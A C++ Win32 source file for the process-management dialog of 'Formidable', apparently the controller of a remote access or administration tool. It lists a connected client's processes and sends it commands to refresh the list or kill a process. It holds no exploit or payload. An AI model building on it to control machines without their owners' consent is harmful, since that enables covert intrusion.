// ProcessDialog.cpp - 进程管理对话框实现
#include "ProcessDialog.h"
#include "ModuleDialog.h"
#include "../../Common/ClientTypes.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../NetworkHelper.h"
#include "../Core/CommandHandler.h"
#include <CommCtrl.h>
#include <vector>
#include <map>
#include <mutex>

// 外部声明
extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern std::map<HWND, Formidable::ListViewSortInfo> g_SortInfo;

namespace Formidable {
namespace UI {

// 静态映射：对话框句柄 -> 客户端ID
static std::map<HWND, uint32_t> s_dlgToClientId;

INT_PTR CALLBACK ProcessDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_dlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_PROCESS)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_PROCESS)));
        
        HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"进程名称"; lvc.cx = 200; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"PID";      lvc.cx = 80;  SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"线程数";   lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"优先级";   lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 3, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"架构";     lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 4, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"内存";     lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 5, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"CPU";      lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 6, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"所有者";   lvc.cx = 120; SendMessageW(hList, LVM_INSERTCOLUMNW, 7, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"文件路径"; lvc.cx = 300; SendMessageW(hList, LVM_INSERTCOLUMNW, 8, (LPARAM)&lvc);
        
        SendMessage(hDlg, WM_COMMAND, IDM_PROCESS_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_PROCESS), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_PROCESS) {
            if (nm->code == NM_RCLICK) {
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_REFRESH, L"刷新列表(&R)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_MODULES, L"查看模块(&M)");
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_KILL, L"结束进程(&K)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_COPY_PATH, L"复制路径(&C)");
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_OPEN_DIR, L"打开目录(&O)");
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            }
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = s_dlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        switch (LOWORD(wParam)) {
        case IDM_PROCESS_REFRESH: {
            Formidable::CommandPkg pkg = { 0 };
            pkg.cmd = CMD_PROCESS_LIST;
            
            size_t bodySize = sizeof(Formidable::CommandPkg);
            std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
            Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
            memcpy(h->flag, "FRMD26?", 7);
            h->originLen = (int)bodySize;
            h->totalLen = (int)sendBuf.size();
            memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
            
            SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
            break;
        }
        case IDM_PROCESS_KILL: {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int selected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (selected >= 0) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = selected;
                ListView_GetItem(hList, &lvi);
                uint32_t pid = (uint32_t)lvi.lParam;

                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = CMD_PROCESS_KILL;
                pkg.arg1 = pid;
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                memcpy(h->flag, "FRMD26?", 7);
                h->originLen = (int)bodySize;
                h->totalLen = (int)sendBuf.size();
                memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
            }
            break;
        }
        case IDM_PROCESS_MODULES: {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_PROCESS);
            int selected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (selected >= 0) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = selected;
                ListView_GetItem(hList, &lvi);
                uint32_t pid = (uint32_t)lvi.lParam;
                
                uint32_t clientId = s_dlgToClientId[hDlg];
                ShowModuleDialog(hDlg, clientId, pid);
            }
            break;
        }
        case IDCANCEL:
            EndDialog(hDlg, IDCANCEL);
            return (INT_PTR)TRUE;
        }
        break;
    }
    case WM_CLOSE:
        if (s_dlgToClientId.count(hDlg)) {
            uint32_t clientId = s_dlgToClientId[hDlg];
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) {
                g_Clients[clientId]->hProcessDlg = NULL;
            }
            s_dlgToClientId.erase(hDlg);
        }
        EndDialog(hDlg, 0);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

HWND ProcessDialog::Show(HWND hParent, uint32_t clientId) {
    return CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_PROCESS), hParent, DlgProc, (LPARAM)clientId);
}

} // namespace UI
} // namespace Formidable
